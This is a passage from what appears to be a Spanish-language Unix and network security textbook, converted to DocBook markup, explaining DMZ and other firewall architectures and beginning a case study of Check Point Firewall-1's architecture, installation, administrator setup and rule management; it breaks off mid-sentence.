seguridad correcta. De cualquier forma, en la pr&#x00E1;ctica esta arquitectura de cortafuegos est&#x00E1; cada
vez m&#x00E1;s en desuso debido a que presenta dos puntos &#x00FA;nicos de fallo, el choke y el basti&#x00F3;n: si un
atacante consigue controlar cualquiera de ellos, tiene acceso a toda la red protegida; por tanto, es
m&#x00E1;s popular, y recomendable, una arquitectura screened subnet, de la que vamos a hablar a
continuaci&#x00F3;n.

  </para></section><!--end subsection--><!--l. 535--><section 
role="subsection"><title><abbrev role="title-mark">15.4.4</abbrev><anchor 
   id="x1-23900015.4.4"  ></anchor>Screened Subnet (DMZ)</title>
<!--l. 536--><para>  La arquitectura Screened Subnet, tambi&#x00E9;n conocida como red perim&#x00E9;trica o De-Militarized Zone
(DMZ) es con diferencia la m&#x00E1;s utilizada e implantada hoy en d&#x02CA;&#x0131;a, ya que a~nade un nivel de
seguridad en las arquitecturas de cortafuegos situando una subred (DMZ) entre las redes externa e
interna, de forma que se consiguen reducir los efectos de un ataque exitoso al host basti&#x00F3;n:
como hemos venido comentando, en los modelos anteriores toda la seguridad se centraba en el
basti&#x00F3;n <anchor 
   id="x1-239001f1"  ></anchor><footnote><para>     Excepto en el primero, compuesto &#x00FA;nicamente por un choke.</para></footnote>,
de forma que si la seguridad del mismo se ve&#x02CA;&#x0131;a comprometida, la amenaza se extend&#x02CA;&#x0131;a autom&#x00E1;ticamente al
resto de la red. Como la m&#x00E1;quina basti&#x00F3;n es un objetivo interesante para muchos piratas, la arquitectura
DMZ intenta aislarla en una red perim&#x00E9;trica de forma que un intruso que accede a esta m&#x00E1;quina no consiga
un acceso total a la subred protegida.
<!--br/-->
<!--br/-->Screened subnet es la arquitectura m&#x00E1;s segura, pero tambi&#x00E9;n la m&#x00E1;s compleja; se utilizan dos routers,
denominados exterior e interior, conectados ambos a la red perim&#x00E9;trica como se muestra en la &#xFB01;gura  <ulink 
  url="#x1-2390022"  ><!--ref: dmz--></ulink>. En
esta red perim&#x00E9;trica, que constituye el sistema cortafuegos, se incluye el host basti&#x00F3;n y tambi&#x00E9;n se podr&#x02CA;&#x0131;an
incluir sistemas que requieran un acceso controlado, como bater&#x02CA;&#x0131;as de m&#x00F3;dems o el servidor de correo, que
ser&#x00E1;n los &#x00FA;nicos elementos visibles desde fuera de nuestra red. El router exterior tiene como misi&#x00F3;n bloquear el
tr&#x00E1;&#xFB01;co no deseado en ambos sentidos (hacia la red perim&#x00E9;trica y hacia la red externa), mientras que el
interior hace lo mismo pero con el tr&#x00E1;&#xFB01;co entre la red interna y la perim&#x00E9;trica: as&#x02CA;&#x0131;, un atacante habr&#x02CA;&#x0131;a
de romper la seguridad de ambos routers para acceder a la red protegida; incluso es posible
implementar una zona desmilitarizada con un &#x00FA;nico router que posea tres o m&#x00E1;s interfaces de red, pero
en este caso si se compromete este &#x00FA;nico elemento se rompe toda nuestra seguridad, frente al
caso general en que hay que comprometer ambos, tanto el externo como el interno. Tambi&#x00E9;n
podemos, si necesitamos mayores niveles niveles de seguridad, de&#xFB01;nir varias redes perim&#x00E9;tricas en
serie, situando los servicios que requieran de menor &#xFB01;abilidad en las redes m&#x00E1;s externas: as&#x02CA;&#x0131;,
el atacante habr&#x00E1; de saltar por todas y cada una de ellas para acceder a nuestros equipos;
evidentemente, si en cada red perim&#x00E9;trica se siguen las mismas reglas de &#xFB01;ltrado, niveles adicionales no
proporcionan mayor seguridad. En el cap&#x02CA;&#x0131;tulo 4 de <citation>[?]</citation> podemos consultar con m&#x00E1;s detalle las
funciones de cada elemento del sistema cortafuegos, as&#x02CA;&#x0131; como aspectos de su implementaci&#x00F3;n y
con&#xFB01;guraci&#x00F3;n.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 577--><para>
heightwidthdepthdmz.png                                                            <graphic width="430.0pt" fileref="dmz.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2390022"  ></anchor>Figura&#x00A0;15.2</title><para>Arquitectura DMZ.</para></blockquote>
</para></section>

  </blockquote></figure>
<!--br/-->Esta arquitectura de cortafuegos elimina los puntos &#x00FA;nicos de fallo presentes en las anteriores: antes de
llegar al basti&#x00F3;n (por de&#xFB01;nici&#x00F3;n, el sistema m&#x00E1;s vulnerable) un atacante ha de saltarse las medidas de
seguridad impuestas por el enrutador externo. Si lo consigue, como hemos aislado la m&#x00E1;quina basti&#x00F3;n en una
subred estamos reduciendo el impacto de un atacante que logre controlarlo, ya que antes de llegar a la red
interna ha de comprometer tambi&#x00E9;n al segundo router; en este caso extremo (si un pirata logra
comprometer el segundo router), la arquitectura DMZ no es mejor que un screened host. Por supuesto, en
cualquiera de los tres casos (compromiso del router externo, del host basti&#x00F3;n, o del router interno) las
actividades de un pirata pueden violar nuestra seguridad, pero de forma parcial: por ejemplo, simplemente
accediendo al primer enrutador puede aislar toda nuestra organizaci&#x00F3;n del exterior, creando una
negaci&#x00F3;n de servicio importante, pero esto suele ser menos grave que si lograra acceso a la red
protegida.
<!--br/-->
<!--br/-->Aunque, como hemos dicho antes, la arquitectura DMZ es la que mayores niveles de seguridad puede
proporcionar, no se trata de la panacea de los cortafuegos. Evidentemente existen problemas relacionados
con este modelo: por ejemplo, se puede utilizar el &#xFB01;rewall para que los servicios &#xFB01;ables pasen directamente
sin acceder al basti&#x00F3;n, lo que puede dar lugar a un incumplimiento de la pol&#x02CA;&#x0131;tica de la organizaci&#x00F3;n. Un
segundo problema, quiz&#x00E1;s m&#x00E1;s grave, es que la mayor parte de la seguridad reside en los routers utilizados;
como hemos dicho antes las reglas de &#xFB01;ltrado sobre estos elementos pueden ser complicadas de con&#xFB01;gurar y
comprobar, lo que puede dar lugar a errores que abran importantes brechas de seguridad en nuestro
sistema.
<!--br/-->
  </section><!--end subsection--><!--l. 610--><section 
role="subsection"><title><abbrev role="title-mark">15.4.5</abbrev><anchor 
   id="x1-24000015.4.5"  ></anchor>Otras arquitecturas</title>
<!--l. 611--><para>  Algo que puede incrementar en gran medida nuestra seguridad y al mismo tiempo facilitar la
administraci&#x00F3;n de los cortafuegos es utilizar un basti&#x00F3;n diferente para cada protocolo o servicio en lugar de
uno s&#x00F3;lo; sin embargo, esta arquitectura presenta el grave inconveniente de la cantidad de m&#x00E1;quinas
necesarias para implementar el &#xFB01;rewall, lo que impide que muchas organizaciones la puedan adoptar. Una
variante m&#x00E1;s barata consistir&#x02CA;&#x0131;a en utilizar un &#x00FA;nico basti&#x00F3;n pero servidores proxy diferentes para cada servicio
ofertado.
<!--br/-->
<!--br/-->Cada d&#x02CA;&#x0131;a es m&#x00E1;s habitual en todo tipo de organizaciones dividir su red en diferentes subredes; esto es
especialmente aplicable en entornos de I+D o empresas medianas, donde con frecuencia se han de conectar
campus o sucursales separadas geogr&#x00E1;&#xFB01;camente, edi&#xFB01;cios o laboratorios diferentes, etc. En esta situaci&#x00F3;n
es recomendable incrementar los niveles de seguridad de las zonas m&#x00E1;s comprometidas (por
ejemplo, un servidor donde se almacenen expedientes o datos administrativos del personal)
insertando cortafuegos internos entre estas zonas y el resto de la red. Aparte de incrementar la
seguridad, &#xFB01;rewalls internos son especialmente recomendables en zonas de la red desde la
que no se permite a priori la conexi&#x00F3;n con Internet, como laboratorios de pr&#x00E1;cticas: un simple
PC con Linux o FreeBSD que deniegue cualquier conexi&#x00F3;n con el exterior del campus va a ser
su&#xFB01;ciente para evitar que los usuarios se dediquen a conectar a p&#x00E1;ginas web o chats desde equipos
no destinados a estos usos. Concretamente en el caso de redes de universidades ser&#x02CA;&#x0131;a muy
interesante &#xFB01;ltrar las conexiones a IRC o a MUDs, ya sea a nivel de aulas o laboratorios o a nivel
de todo el campus, denegando en el router de salida de la red hacia INet cualquier tr&#x00E1;&#xFB01;co a
los puertos 6667, 8888 y similares; aunque realmente esto no evitar&#x02CA;&#x0131;a que todos los usuarios
siguieran jugando desde los equipos de la universidad &#x2013; por ejemplo a trav&#x00E9;s de un servidor que
disponga de conexi&#x00F3;n en otros puertos &#x2013;, s&#x02CA;&#x0131; conseguir&#x02CA;&#x0131;a que la mayor parte de ellos dejara de
hacerlo.


</para><!--l. 1--><para>

  </para></section><!--end subsection--></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-24100016"  ></anchor>Cortafuegos: Casos de estudio</title>
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">16.1</abbrev><anchor 
   id="x1-24200016.1"  ></anchor>Firewall-1</title>
<!--l. 3--><para>
  </para><!--l. 3--><section 
role="subsection"><title><abbrev role="title-mark">16.1.1</abbrev><anchor 
   id="x1-24300016.1.1"  ></anchor>Introducci&#x00F3;n</title>
<!--l. 4--><para>  Quiz&#x00E1;s el cortafuegos m&#x00E1;s utilizado actualmente en Internet es FireWall-1, desarrollado por la empresa
israel&#x02CA;&#x0131; Check Point Software Technologies Ltd. (http://www.checkpoint.com/). Este &#xFB01;rewall se ejecuta
sobre diferentes sistemas Unix (Solaris, AIX, Linux y HP-UX), as&#x02CA;&#x0131; como sobre Windows NT y tambi&#x00E9;n en
&#x2018;cajas negras&#x2019; como las desarrolladas por Nokia, que poseen un sistema operativo propio (IPSO) basado en
FreeBSD.
<!--br/-->
<!--br/-->Quiz&#x00E1;s la caracter&#x02CA;&#x0131;stica m&#x00E1;s importante de Firewall-1 sea que incorpora una nueva arquitectura dentro del
mundo de los cortafuegos: la inspecci&#x00F3;n con estado (stateful inspection). Firewall-1 inserta un m&#x00F3;dulo
denominado Inspection Module en el n&#x00FA;cleo del sistema operativo sobre el que se instala, en el nivel software
m&#x00E1;s bajo posible (por debajo incluso del nivel de red), tal y como se muestra en la &#xFB01;gura  <ulink 
  url="#x1-2430011"  ><!--ref: fw1--></ulink>; as&#x02CA;&#x0131;, desde ese
nivel tan bajo, Firewall-1 puede interceptar y analizar todos los paquetes antes de que lleguen al
resto del sistema: se garantiza que ning&#x00FA;n paquete es procesado por ninguno de los protocolos
superiores hasta que Firewall-1 comprueba que no viola la pol&#x02CA;&#x0131;tica de seguridad de&#xFB01;nida en el
cortafuegos.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 22--><para>
heightwidthdepthfw1.png                                                             <graphic width="430.0pt" fileref="fw1.png" ></graphic>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2430011"  ></anchor>Figura&#x00A0;16.1</title><para>Ubicaci&#x00F3;n del Inspection Module dentro de la pila de protocolos OSI.</para></blockquote>
</para></section>

  </blockquote></figure>
<!--br/-->Firewall-1 es capaz de analizar la informaci&#x00F3;n de una trama en cada uno de los siete niveles OSI y a la vez
analizar informaci&#x00F3;n de estado registrada de anteriores comunicaciones; el cortafuegos entiende la
estructura de los diferentes protocolos TCP/IP &#x2013; incluso de los ubicados en la capa de aplicaci&#x00F3;n &#x2013;, de forma
que el Inspection Module extrae la informaci&#x00F3;n relevante de cada paquete para construir tablas din&#x00E1;micas
que se actualizan constantemente, tablas que el &#xFB01;rewall utiliza para analizar comunicaciones posteriores.
En el m&#x00F3;dulo de inspecci&#x00F3;n se implantan las pol&#x02CA;&#x0131;ticas de seguridad de&#xFB01;nidas en cada organizaci&#x00F3;n mediante
un sencillo lenguaje denominado INSPECT, tambi&#x00E9;n dise~nado por Check Point Software Technologies; desde
un c&#x00F3;modo interfaz se genera un script en este lenguaje, que se compila y se inserta en el Inspection
Module.
<!--br/-->
<!--br/-->La gran potencia y &#xFB02;exibilidad de Firewall-1 hacen imposible que se aqu&#x02CA;&#x0131; se puedan explicar con el
su&#xFB01;ciente nivel de detalle todas sus caracter&#x02CA;&#x0131;sticas; para m&#x00E1;s informaci&#x00F3;n, excelentes lecturas pueden ser <citation>[?]</citation> o
(m&#x00E1;s reciente) <citation>[?]</citation>. Tambi&#x00E9;n la documentaci&#x00F3;n que acompa~na al producto, y la disponible en el servidor web de
Check Point Software Technologies, es de gran ayuda para cualquier administrador que utilice este
cortafuegos en su red.
  </section><!--end subsection--><!--l. 49--><section 
role="subsection"><title><abbrev role="title-mark">16.1.2</abbrev><anchor 
   id="x1-24400016.1.2"  ></anchor>Arquitectura</title>
<!--l. 50--><para>  Firewall-1 est&#x00E1; basado en dos m&#x00F3;dulos independientes: el de gesti&#x00F3;n (o control) y el de cortafuegos. El
primero de ellos est&#x00E1; formado por el gestor gr&#x00E1;&#xFB01;co de pol&#x02CA;&#x0131;ticas (incluyendo el visor de registros) y el servidor
de gesti&#x00F3;n, t&#x02CA;&#x0131;picamente un demonio (fwm) que se ejecuta en una m&#x00E1;quina Unix. El gestor gr&#x00E1;&#xFB01;co puede ser
un cliente Unix (con X/Motif) o Windows 9x/NT; es triste que a estas alturas no exista un
cliente gr&#x00E1;&#xFB01;co para Linux, encontr&#x00E1;ndose &#x00FA;nicamente para otros Unices, y que adem&#x00E1;s el cliente
X/Motif contenga errores y sea bastante ine&#xFB01;ciente, lo que motiva que se tienda a utilizar
clientes Windows para gestionar los cortafuegos. En cualquier caso, el gestor gr&#x00E1;&#xFB01;co puede
ejecutarse en la misma m&#x00E1;quina que el servidor de gesti&#x00F3;n o en una diferente, mediante un esquema
cliente/servidor. Este gestor no hace m&#x00E1;s que presentar de una forma c&#x00F3;moda al administrador
del cortafuegos la informaci&#x00F3;n generada por el servidor de gesti&#x00F3;n (el demonio fwm), que es el
verdadero &#x2018;coraz&#x00F3;n&#x2019; de la gesti&#x00F3;n del &#xFB01;rewall y que permite administrar diferentes sistemas con
m&#x00F3;dulo de cortafuegos (en castellano plano, diferentes cortafuegos) desde una misma estaci&#x00F3;n de
control.
<!--br/-->
<!--br/-->Por otra parte, el m&#x00F3;dulo de cortafuegos est&#x00E1; formado por el inspection module, los demonios de Firewall-1 y
los servidores de seguridad del &#xFB01;rewall. El inspection module se instala como ya hemos comentado (&#xFB01;gura
<ulink 
  url="#x1-2430011"  ><!--ref: fw1--></ulink>) entre el nivel de enlace y el nivel de red, por completo antes de la pila de protocolos TCP/IP, con lo que
se asegura que Firewall-1 analiza todos y cada uno de los paquetes que pasan por el sistema. Los
demonios del &#xFB01;rewall son simples programas con diferentes funciones, como la comunicaci&#x00F3;n con el
servidor de gesti&#x00F3;n o la carga de las reglas de&#xFB01;nidas para el cortafuegos en el inspection module.
Finalmente, los servidores de seguridad son m&#x00F3;dulos que se invocan cuando as&#x02CA;&#x0131; se de&#xFB01;ne en la pol&#x02CA;&#x0131;tica
(por ejemplo, cuando la acci&#x00F3;n asociada a una determinada regla es User Authentication),
y que realizan tareas de autenticaci&#x00F3;n y seguridad de contenidos; la conexi&#x00F3;n entre origen y
destino se divide en dos, una entre el origen y el servidor de seguridad y otra entre este y el
destino.
  </para></section><!--end subsection--><!--l. 83--><section 
role="subsection"><title><abbrev role="title-mark">16.1.3</abbrev><anchor 
   id="x1-24500016.1.3"  ></anchor>Instalaci&#x00F3;n</title>
<!--l. 84--><para>  Antes de instalar Firewall-1 en un sistema Unix es muy importante deshabilitar en el n&#x00FA;cleo
del operativo el IP Forwarding, de forma que todo el reenv&#x02CA;&#x0131;o de tramas sea gestionado por
el software de cortafuegos (esta opci&#x00F3;n se de&#xFB01;ne durante la instalaci&#x00F3;n). Esto permite que el
reenv&#x02CA;&#x0131;o s&#x00F3;lo sea posible si el &#xFB01;rewall est&#x00E1; ejecut&#x00E1;ndose &#x2013; es decir, protegiendo nuestra red &#x2013;, lo
que imposibilita que la m&#x00E1;quina reenv&#x02CA;&#x0131;e paquetes si Firewall-1 no est&#x00E1; activo, algo que como
vimos a la hora de hablar de diferentes clones de Unix puede ser problem&#x00E1;tico para nuestra
seguridad.
<!--br/-->
<!--br/-->Teniendo en cuenta la consideraci&#x00F3;n anterior, y asumiendo que en la m&#x00E1;quina donde vamos a instalar

Firewall-1 no existen problemas ajenos al cortafuegos (conectividad, resoluci&#x00F3;n de nombres, reconocimiento
de interfaces de red&#x2026;), la instalaci&#x00F3;n del software no ofrece ninguna di&#xFB01;cultad: simplemente hemos de
instalar los paquetes correspondientes con las &#x00F3;rdenes habituales de cada Unix (pkgadd en Solaris,
swinstall en HP-UX&#x2026;) o, en algunas versiones del programa, ejecutar la orden fwinstall, que no es m&#x00E1;s
que una instalaci&#x00F3;n seguida de una con&#xFB01;guraci&#x00F3;n del cortafuegos equivalente a la que veremos a
continuaci&#x00F3;n.
<!--br/-->
<!--br/-->Una vez instalado el &#xFB01;rewall hemos de con&#xFB01;gurarlo; para ello no tenemos m&#x00E1;s que ejecutar la orden
fwconfig (versi&#x00F3;n 4.0) o cpconfig (versi&#x00F3;n 4.1), que paso a paso nos guiar&#x00E1; a trav&#x00E9;s de la con&#xFB01;guraci&#x00F3;n (o
recon&#xFB01;guraci&#x00F3;n, una vez el cortafuegos est&#x00E9; ya funcionando) de Firewall-1:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;fwconfig
&#x00A0;
&#x00A0;Welcome&#x00A0;to&#x00A0;VPN-1&#x00A0;&#x0026;&#x00A0;FireWall-1&#x00A0;Configuration&#x00A0;Program
&#x00A0;=================================================
&#x00A0;This&#x00A0;program&#x00A0;will&#x00A0;let&#x00A0;you&#x00A0;re-configure
&#x00A0;your&#x00A0;VPN-1&#x00A0;&#x0026;&#x00A0;FireWall-1&#x00A0;configuration.
&#x00A0;
&#x00A0;
&#x00A0;Configuration&#x00A0;Options:
&#x00A0;----------------------
&#x00A0;(1)&#x00A0;&#x00A0;Licenses
&#x00A0;(2)&#x00A0;&#x00A0;Administrators
&#x00A0;(3)&#x00A0;&#x00A0;GUI&#x00A0;clients
&#x00A0;(4)&#x00A0;&#x00A0;Remote&#x00A0;Modules
&#x00A0;(5)&#x00A0;&#x00A0;SMTP&#x00A0;Server
&#x00A0;(6)&#x00A0;&#x00A0;SNMP&#x00A0;Extension
&#x00A0;(7)&#x00A0;&#x00A0;Groups
&#x00A0;(8)&#x00A0;&#x00A0;IP&#x00A0;Forwarding
&#x00A0;(9)&#x00A0;&#x00A0;Default&#x00A0;Filter
&#x00A0;(10)&#x00A0;CA&#x00A0;Keys
&#x00A0;
&#x00A0;(11)&#x00A0;Exit
&#x00A0;
&#x00A0;Enter&#x00A0;your&#x00A0;choice&#x00A0;(1-11)&#x00A0;:&#x00A0;11
&#x00A0;
&#x00A0;Thank&#x00A0;You...
&#x00A0;anita:/#
</literallayout>
<!--l. 138--><para>Como podemos ver, esta herramienta permite realizar tareas como la instalaci&#x00F3;n de licencias, la plani&#xFB01;caci&#x00F3;n
del software en el arranque de la m&#x00E1;quina o la de&#xFB01;nici&#x00F3;n de m&#x00F3;dulos de &#xFB01;rewall remotos. Aunque todo es vital
para el correcto funcionamiento del cortafuegos, existen dos apartados especialmente importantes para la
posterior gesti&#x00F3;n del &#xFB01;rewall: la de&#xFB01;nici&#x00F3;n de administradores y la de&#xFB01;nici&#x00F3;n de estaciones que actuar&#x00E1;n
como clientes gr&#x00E1;&#xFB01;cos; si no de&#xFB01;nimos al menos un administrador y una estaci&#x00F3;n cliente, no
podremos acceder al cortafuegos para gestionarlo (evidentemente, en esta situaci&#x00F3;n no estar&#x02CA;&#x0131;a todo
perdido, ya que siempre podemos a~nadir ambos elementos, as&#x02CA;&#x0131; como modi&#xFB01;car su relaci&#x00F3;n, a
posteriori).
<!--br/-->
<!--br/-->El administrador o administradores que de&#xFB01;namos ser&#x00E1;n los encargados de acceder a las pol&#x02CA;&#x0131;ticas del
cortafuegos a trav&#x00E9;s del gestor gr&#x00E1;&#xFB01;co, &#x00FA;nicamente desde las estaciones que hayamos de&#xFB01;nido como
cliente. Podemos a~nadir elementos a ambas listas (la de administradores y la de estaciones
gr&#x00E1;&#xFB01;cas) ejecutando de nuevo fwconfig o cpconfig, o bien de forma m&#x00E1;s directa ejecutando la
orden fwm (para a~nadir administradores) y modi&#xFB01;cando el archivo $FWDIR/conf/gui-clients
(para a~nadir clientes gr&#x00E1;&#xFB01;cos); este archivo no es m&#x00E1;s que un &#xFB01;chero de texto donde se listan
las direcciones IP (o los nombres DNS) de las m&#x00E1;quinas que pueden acceder a gestionar el
&#xFB01;rewall:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;$FWDIR/conf/gui-clients
&#x00A0;192.168.0.1
&#x00A0;192.168.0.2
&#x00A0;192.168.0.3
&#x00A0;158.42.22.41
&#x00A0;anita:/#&#x00A0;fwm&#x00A0;-p
&#x00A0;FireWall-1&#x00A0;Remote&#x00A0;Manager&#x00A0;Users:
&#x00A0;================================
&#x00A0;toni&#x00A0;(Read/Write)
&#x00A0;avh&#x00A0;(Read/Write)
&#x00A0;
&#x00A0;Total&#x00A0;of&#x00A0;2&#x00A0;users
&#x00A0;anita:/#&#x00A0;fwm&#x00A0;-a&#x00A0;admin&#x00A0;-wr
&#x00A0;Password:
&#x00A0;Verify&#x00A0;Password:
&#x00A0;User&#x00A0;admin&#x00A0;added&#x00A0;succesfully
&#x00A0;anita:/#&#x00A0;fwm&#x00A0;-p
&#x00A0;FireWall-1&#x00A0;Remote&#x00A0;Manager&#x00A0;Users:
&#x00A0;================================
&#x00A0;toni&#x00A0;(Read/Write)
&#x00A0;avh&#x00A0;(Read/Write)
&#x00A0;admin&#x00A0;(Read&#x00A0;Only)
&#x00A0;
&#x00A0;Total&#x00A0;of&#x00A0;3&#x00A0;users
&#x00A0;anita:/#&#x00A0;fwm&#x00A0;-r&#x00A0;prova
&#x00A0;User&#x00A0;prova&#x00A0;removed&#x00A0;succesfully
&#x00A0;anita:/#
</literallayout>
<!--l. 191--><para>Para acabar con la instalaci&#x00F3;n de Firewall-1 es necesario de&#xFB01;nir la variable de entorno $FWDIR, que apuntar&#x00E1; al
directorio /etc/fw/, y a~nadirla en los scripts de inicio de sesi&#x00F3;n correspondientes. Tambi&#x00E9;n es recomendable
a~nadir el directorio $FWDIR/bin/ a nuestro $PATH, ya que ah&#x02CA;&#x0131; se ubican las utilidades de gesti&#x00F3;n del
cortafuegos, y hacer lo mismo con $FWDIR/man/ y la variable $MANPATH, ya que en este directorio se
encuentran las p&#x00E1;ginas de manual del &#xFB01;rewall.
<!--br/-->
<!--br/-->Antes de &#xFB01;nalizar este punto quiz&#x00E1;s es necesaria una peque~na advertencia: como Firewall-1 inserta m&#x00F3;dulos
en el n&#x00FA;cleo del operativo, es dependiente de la versi&#x00F3;n del kernel utilizada. Todas las versiones m&#x00E1;s o menos
modernas funcionan correctamente sobre Solaris 2.6 y la &#x00FA;ltima tambi&#x00E9;n sobre Solaris 7; no obstante, sobre
este &#x00FA;ltimo el resto de versiones no funcionan bien, aunque se instalen correctamente. Es posible, y
esto lo digo por experiencia, que la m&#x00E1;quina no arranque tras instalar el software debido a las
modi&#xFB01;caciones de los scripts de arranque (concretamente los ubicados en /etc/rcS.d/), que al ser
invocados desde /sbin/rcS producen errores que impiden montar correctamente los discos
y proseguir el arranque; para solucionar estos problemas, lo m&#x00E1;s r&#x00E1;pido es eliminar cualquier
modi&#xFB01;caci&#x00F3;n que la instalaci&#x00F3;n de Firewall-1 haya realizado sobre los programas ejecutados al iniciar el
sistema.
  </para></section><!--end subsection--><!--l. 213--><section 
role="subsection"><title><abbrev role="title-mark">16.1.4</abbrev><anchor 
   id="x1-24600016.1.4"  ></anchor>Gesti&#x00F3;n</title>
<!--l. 214--><para>  Como cualquier sistema cortafuegos, Firewall-1 permite al usuario de&#xFB01;nir una pol&#x02CA;&#x0131;tica de seguridad
formada por reglas, cada una de las cuales se basa principalmente en el origen, destino y servicio de una
determinada trama. El conjunto de reglas se examina de arriba hacia abajo, de forma que si una
determinada regla hace match con el paquete que se est&#x00E1; inspeccionando, se aplica y las que quedan por
debajo de ella ni siquiera se examinan; como deber&#x02CA;&#x0131;a suceder en cualquier sistema cortafuegos, las tramas

no expl&#x02CA;&#x0131;citamente aceptadas se rechazan.
<!--br/-->
<!--br/-->La gesti&#x00F3;n de Firewall-1 suele ser completamente gr&#x00E1;&#xFB01;ca, a trav&#x00E9;s de dos interfaces principales: el de gesti&#x00F3;n de
pol&#x02CA;&#x0131;ticas (fwui) y el visor de logs (fwlv, mostrado en la &#xFB01;gura  <ulink 
  url="#x1-2460012"  ><!--ref: fwlv--></ulink>). En versiones m&#x00E1;s recientes del &#xFB01;rewall
ambos se uni&#xFB01;can en fwpolicy, basado en X/Motif (los anteriores se basan en OpenLook), m&#x00E1;s c&#x00F3;modo e
intuitivo que sus predecesores. En cualquier caso, siempre tenemos la opci&#x00F3;n de trabajar en modo texto
mediante la orden fw, aunque esta opci&#x00F3;n no suele ser la habitual entre los administradores de
Firewall-1.
<!--br/-->
<!--br/-->Para gestionar el cortafuegos, cada uno de los administradores de&#xFB01;nidos anteriormente puede conectar
desde las estaciones gr&#x00E1;&#xFB01;cas autorizadas al servidor de gesti&#x00F3;n (m&#x00E1;quina en la que se ha instalado el m&#x00F3;dulo de
gesti&#x00F3;n de Firewall-1), para lo cual necesita autenticarse mediante su nombre de usuario y su clave; una vez
conectado, si su acceso es de lectura y escritura, puede comenzar a trabajar con el cortafuegos. Lo
primero que ver&#x00E1; ser&#x00E1; la pol&#x02CA;&#x0131;tica del &#xFB01;rewall (de hecho, ha conectado con el editor de pol&#x02CA;&#x0131;ticas de
Firewall-1); estas pol&#x02CA;&#x0131;ticas no son m&#x00E1;s que &#xFB01;cheros ubicados en $FWDIR/conf/, con un nombre
&#xFB01;nalizado en &#x2018;.W&#x2019;, que se compilan y cargan en los sistemas donde est&#x00E1; instalado el m&#x00F3;dulo de
cortafuegos.
<!--br/-->
<!--br/-->Desde el editor gr&#x00E1;&#xFB01;co, las pol&#x02CA;&#x0131;ticas se ven como un conjunto de reglas que se examina de arriba a abajo
hasta que una de ellas hace match con el paquete que se est&#x00E1; analizando (como ya hemos comentado, si
ninguna de ellas hace match, el paquete se deniega). Cada una de estas reglas est&#x00E1; numerada en funci&#x00F3;n del
orden de aplicaci&#x00F3;n, y sus campos principales son los habituales en cualquier cortafuegos: origen, destino,
servicio y acci&#x00F3;n. Adem&#x00E1;s, existen un campo que indica si se ha de registrar la trama (&#x2018;Track&#x2019;),
otro para determinar d&#x00F3;nde se ha de instalar (&#x2018;Install On&#x2019;), otro para especi&#xFB01;car el tiempo
que la regla estar&#x00E1; activa (&#x2018;Time&#x2019;) y &#xFB01;nalmente un campo de texto donde se pueden incluir
comentarios.
<!--br/-->
<!--br/-->Evidentemente, como sucede en cualquier &#xFB01;rewall, tanto el campo origen como el destino pueden ser
sistemas concretos o redes completas. En Firewall-1 ambos elementos, as&#x02CA;&#x0131; como los servicios, se manejan
como objetos: elementos de&#xFB01;nidos por el administrador e identi&#xFB01;cados mediante un nombre &#x2013; en principio
algo f&#x00E1;cilmente identi&#xFB01;cable por el mismo &#x2013;, con una serie de propiedades determinadas. Sin duda, en el
caso de los hosts o las redes la propiedad m&#x00E1;s importante es la direcci&#x00F3;n IP o la direcci&#x00F3;n de red con
su m&#x00E1;scara correspondiente asociadas al objeto; en el caso de los servicios, de&#xFB01;nidos tambi&#x00E9;n
por un nombre, la caracter&#x02CA;&#x0131;stica m&#x00E1;s importante es el puerto o rango de puertos asociado al
mismo. Por ejemplo, podemos de&#xFB01;nir el objeto &#x2018;servidor1&#x2019;, con su IP correspondiente, el objeto
DMZ, con su direcci&#x00F3;n de red y m&#x00E1;scara asociada, o el objeto ssh, con su puerto concreto; en
todos los casos, el nombre dice mucho m&#x00E1;s al encargado de gestionar el cortafuegos que una
simple IP, direcci&#x00F3;n de red o n&#x00FA;mero de puerto, lo que facilita enormemente la administraci&#x00F3;n del
&#xFB01;rewall.
<!--br/-->
<!--br/-->El campo &#x2018;Action&#x2019; de cada regla de&#xFB01;ne qu&#x00E9; se ha de hacer con una conexi&#x00F3;n cuando hace match con la
regla; al igual que en la mayor parte de cortafuegos del mercado, tres son las acciones principales a tomar:
&#x2018;Accept&#x2019;, si dejamos que la conexi&#x00F3;n se establezca a trav&#x00E9;s del &#xFB01;rewall, &#x2018;Reject&#x2019;, si la rechazamos, y
&#x2018;Drop&#x2019;, si la rechazamos sin noti&#xFB01;carlo al origen. Para las conexiones que no permitimos, esta &#x00FA;ltima suele
ser la mejor opci&#x00F3;n, ya que el paquete se elimina sin ning&#x00FA;n tipo de noti&#xFB01;caci&#x00F3;n hacia el origen; si
utiliz&#x00E1;ramos &#x2018;Reject&#x2019; s&#x02CA;&#x0131; que informar&#x02CA;&#x0131;amos de las conexiones no permitidas, lo que puede ayudar
a un atacante a conocer tanto nuestra pol&#x02CA;&#x0131;tica de seguridad como la topolog&#x02CA;&#x0131;a de nuestra
red.
<!--br/-->
<!--br/-->Por su parte, el campo &#x2018;Track&#x2019; de una regla determina una medida a tomar cuando un paquete hace
match con la regla en cuesti&#x00F3;n: ninguna medida (campo vac&#x02CA;&#x0131;o), un registro en diferentes formatos (&#x2018;Short
Log&#x2019;, &#x2018;Long Log&#x2019; y &#x2018;Accounting&#x2019;), una alerta de seguridad, un correo electr&#x00F3;nico, un trap
SNMP o una acci&#x00F3;n de&#xFB01;nida por el usuario (estas cuatro &#x00FA;ltimas acciones han de ser con&#xFB01;guradas
por el administrador del cortafuegos). Evidentemente, este campo es muy &#x00FA;til para obtener
informaci&#x00F3;n acerca de posibles hechos que traten de comprometer nuestra seguridad, tanto en un log
habitual como para implantar en el &#xFB01;rewall un sistema de detecci&#x00F3;n de intrusos y respuesta
autom&#x00E1;tica en tiempo real (<citation>[?]</citation>); en el punto  <ulink 
  url="#x1-24700016.1.5"  ><!--ref: fw1log--></ulink> hablaremos con m&#x00E1;s detalle del sistema de log de

Firewall-1.
<!--br/-->
<!--br/-->Una vez que hemos de&#xFB01;nido una pol&#x02CA;&#x0131;tica &#x2013; un conjunto de reglas &#x2013; lo m&#x00E1;s habitual es aplicarla en un
